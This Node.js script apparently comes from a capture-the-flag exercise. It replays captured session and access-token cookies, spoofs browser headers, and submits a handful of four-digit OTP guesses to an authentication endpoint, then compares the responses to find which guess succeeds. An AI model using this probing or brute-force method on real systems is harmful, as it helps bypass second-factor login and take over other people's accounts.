require('dotenv').config();
const axios = require('axios');

const CONFIG = {
    target: process.env.TARGET_HOST,
    endpoint: process.env.TARGET_ENDPOINT || '/phase1/auth/otp_challenge',
    timeout: 10000
};

const HEADERS = {
    'Host': new URL(CONFIG.target).hostname,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-GB,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': `${CONFIG.target}${CONFIG.endpoint}`,
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': CONFIG.target,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive'
};

const COOKIES = {
    'Hidden-Flag-Part': process.env.COOKIE_HIDDEN_FLAG_PART || 'Check_The_Headers_Instead',
    'UserData': process.env.COOKIE_USER_DATA || 'VXNlcjpBZG1pbnxDcmVkaXRDYXJkOjQ0NDQtNTU1NS02NjY2LTc3Nzd8RmxhZzpNZXJkZWthU2liZXJ7VW4zbmNyeXB0M2RfQzAwazEzX1AxMX0=',
    'IsAdmin': process.env.COOKIE_IS_ADMIN || '0',
    'session': process.env.COOKIE_SESSION || '.eJyrViooSo1PLC3JiC8tTi1SslJKTMnNzFPSUSouSS0wjE_Jz0tVsiopKk2FiBghidQCAKe-FfM.adsJ4Q.vJukFR-ExxzqgIeI1dufluQzDXU',
    'accessToken': process.env.COOKIE_ACCESS_TOKEN || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYWE4MWU2My1jNWVjLTRhYjAtODhjZi0yODE4NzhlNWMxZTEiLCJyb2xlIjoiUEFSVElDSVBBTlQiLCJpYXQiOjE3NzYyMzc0ODIsImV4cCI6MTc3NjIzODM4Mn0.jS2QQc__LPTGgMxLsIA2SRaRAR0l93ylHKvoWgrQE5Q'
};

function buildCookieString() {
    return Object.entries(COOKIES)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');
}

async function testOTP(otp) {
    const cookieString = buildCookieString();
    const otpFormatted = otp.toString().padStart(4, '0');
    
    try {
        const response = await axios.post(
            `${CONFIG.target}${CONFIG.endpoint}`,
            `otp=${otpFormatted}`,
            {
                headers: {
                    ...HEADERS,
                    'Cookie': cookieString,
                    'Content-Length': `otp=${otpFormatted}`.length.toString()
                },
                timeout: CONFIG.timeout,
                maxRedirects: 0,
                validateStatus: () => true
            }
        );
        
        return {
            otp: otpFormatted,
            status: response.status,
            statusText: response.statusText,
            headers: response.headers,
            data: response.data,
            dataLength: response.data?.length || 0,
            contentType: response.headers['content-type']
        };
    } catch (error) {
        return {
            otp: otpFormatted,
            status: error.response?.status || 'ERROR',
            error: error.message
        };
    }
}

async function main() {
    console.log('🔍 Testing Multiple OTPs to Identify Success Pattern\n');
    console.log('=' .repeat(80));
    
    const testOTPs = [1234, 0000, 9999, 1111, 8888];
    
    for (const otp of testOTPs) {
        console.log(`\n🔑 Testing OTP: ${otp.toString().padStart(4, '0')}`);
        console.log('-'.repeat(80));
        
        const result = await testOTP(otp);
        
        console.log(`📊 Status: ${result.status} ${result.statusText || ''}`);
        console.log(`📏 Content-Length: ${result.headers?.['content-length'] || 'N/A'}`);
        console.log(`📄 Content-Type: ${result.contentType || 'N/A'}`);
        
        if (result.headers?.location) {
            console.log(`📍 Location: ${result.headers.location}`);
        }
        
        if (result.data) {
            const dataStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
            console.log(`\n📄 Response Body (${dataStr.length} chars):`);
            console.log('─'.repeat(80));
            
            if (dataStr.length > 500) {
                console.log(dataStr.substring(0, 500) + '...');
            } else {
                console.log(dataStr);
            }
            console.log('─'.repeat(80));
            
            const keywords = ['invalid', 'incorrect', 'success', 'welcome', 'error', 'failed', 'dashboard', 'redirect', 'login'];
            const foundKeywords = keywords.filter(kw => dataStr.toLowerCase().includes(kw));
            if (foundKeywords.length > 0) {
                console.log(`🔍 Keywords found: ${foundKeywords.join(', ')}`);
            }
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    console.log('\n' + '='.repeat(80));
    console.log('✅ Analysis complete! Compare the responses above to identify the success pattern.');
    console.log('💡 Look for differences in: status code, location header, or response body content');
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = { testOTP };
